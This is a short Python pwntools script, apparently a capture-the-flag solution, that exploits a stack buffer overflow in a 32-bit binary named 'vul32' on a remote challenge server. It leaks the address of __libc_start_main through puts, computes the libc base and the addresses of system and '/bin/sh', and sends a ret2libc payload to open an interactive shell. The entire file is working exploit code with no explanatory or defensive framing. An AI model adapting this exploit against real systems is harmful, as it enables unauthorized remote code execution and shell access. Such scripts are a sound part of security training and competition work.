##!/usr/bin/env python
from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']
# context.arch = 'amd64'
context.log_level = "debug"

sh = remote("cssc.vul337.team", 49252)
# sh = process('./vul32')
# pwnlib.gdb.attach(proc.pidof(sh)[0])

vul32 = ELF('./vul32')
libc = ELF('./libc.so.6')

libc_start_main_got = vul32.got['__libc_start_main']
# write_plt = vul32.plt['write']
puts_plt = vul32.plt['puts']
main = vul32.symbols['main']

print("leak libc_start_main_got addr and return to main again")
payload = flat(['a' * 0x33, 'G', puts_plt, main, libc_start_main_got])
# payload = flat(
#     ['A' * 0x33, 'G', write_plt, main,
#      p32(1), libc_start_main_got,
#      p32(4)])

# pause()
# sh.sendline(payload)

sh.sendlineafter(b'Plz input something:\n', payload)
# pwnlib.gdb.attach(proc.pidof(sh)[0])

sh.recvline()
re = sh.recv()[0:4]
libc_start_main_addr = u32(re)
# libc_start_main_addr = u32(sh.recv()[0:4])

libcbase = libc_start_main_addr - libc.symbols['__libc_start_main']
system_addr = libcbase + libc.symbols['system']
binsh_addr = libcbase + 0x0015912b

print("get shell")
payload = flat(['A' * 0x33, 'G', system_addr, 0xdeadbeef, binsh_addr])

sh.sendline(payload)

sh.recvline()
sh.interactive()
sh.close()